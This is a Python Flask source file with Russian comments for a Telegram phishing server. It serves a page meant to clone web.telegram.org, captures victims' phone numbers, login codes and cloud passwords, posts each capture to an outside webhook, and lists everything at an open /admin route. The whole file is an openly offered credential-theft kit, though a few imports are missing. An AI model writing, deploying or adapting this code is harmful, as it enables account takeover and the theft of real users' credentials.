import os
import json
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template, redirect, url_for
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# 🎯 База данных "жертв"
captured_data = []

class TelegramPhisher:
    def __init__(self):
        self.webhook_url = os.getenv('WEBHOOK_URL', '')  # Для отправки данных в Telegram
    
    def save_credentials(self, phone, code, password=None, session_data=None):
        """Сохраняем перехваченные данные"""
        victim_data = {
            'phone': phone,
            'code': code,
            'password': password,
            'session_data': session_data,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'timestamp': datetime.now().isoformat(),
            'status': 'captured'
        }
        
        captured_data.append(victim_data)
        
        # Отправляем уведомление (опционально)
        if self.webhook_url:
            self.send_notification(victim_data)
        
        print(f"🎣 Перехвачены данные: {phone} | Код: {code}")
        return victim_data
    
    def send_notification(self, data):
        """Отправляем уведомление о новой жертве"""
        try:
            message = f"🎣 Новые данные!\n📱 Телефон: {data['phone']}\n🔐 Код: {data['code']}"
            if data.get('password'):
                message += f"\n🔑 Пароль: {data['password']}"
            
            requests.post(self.webhook_url, json={'text': message})
        except:
            pass

# Инициализация фишера
phisher = TelegramPhisher()

# 🎯 Маршруты
@app.route('/')
def index():
    """Главная страница - клон web.telegram.org"""
    return render_template('index.html')

@app.route('/auth/start', methods=['POST'])
def auth_start():
    """Принимаем номер телефона"""
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Введите номер телефона'})
        
        # Сохраняем номер
        session_id = f"phish_{int(time.time())}"
        request.session['phish_id'] = session_id
        request.session['phone'] = phone
        
        # Имитируем отправку кода
        fake_code = str(random.randint(10000, 99999))
        
        return jsonify({
            'success': True,
            'message': f'Код отправлен на {phone}',
            'next_step': 'code',
            'debug_code': fake_code  # Для тестирования
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/auth/code', methods=['POST'])
def auth_code():
    """Принимаем код подтверждения"""
    try:
        data = request.get_json()
        code = data.get('code', '').strip()
        phone = data.get('phone', '')  # На всякий случай
        
        if not code:
            return jsonify({'success': False, 'error': 'Введите код'})
        
        # Сохраняем код
        victim_data = phisher.save_credentials(phone, code)
        
        # Проверяем, нужен ли пароль (рандомно)
        needs_password = random.choice([True, False])
        
        if needs_password:
            return jsonify({
                'success': True,
                'message': 'Введите пароль от облачного хранилища',
                'next_step': 'password'
            })
        else:
            return jsonify({
                'success': True,
                'message': '✅ Авторизация успешна!',
                'next_step': 'complete',
                'redirect': '/success'
            })
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/auth/password', methods=['POST'])
def auth_password():
    """Принимаем пароль"""
    try:
        data = request.get_json()
        password = data.get('password', '')
        phone = data.get('phone', '')
        code = data.get('code', '')
        
        if not password:
            return jsonify({'success': False, 'error': 'Введите пароль'})
        
        # Сохраняем все данные
        victim_data = phisher.save_credentials(phone, code, password)
        
        return jsonify({
            'success': True,
            'message': '✅ Авторизация успешна!',
            'next_step': 'complete',
            'redirect': '/success'
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/success')
def success():
    """Страница "успешной" авторизации"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Telegram</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #18222d; color: white; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 100px auto; text-align: center; }
            .logo { font-size: 48px; margin-bottom: 20px; }
            .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">✈️</div>
            <h1>Добро пожаловать в Telegram!</h1>
            <p>Ваш аккаунт успешно подключен.</p>
            <button class="btn" onclick="window.close()">Закрыть</button>
        </div>
    </body>
    </html>
    '''

@app.route('/admin')
def admin():
    """Админка для просмотра перехваченных данных"""
    return jsonify({
        'total_captured': len(captured_data),
        'data': captured_data
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
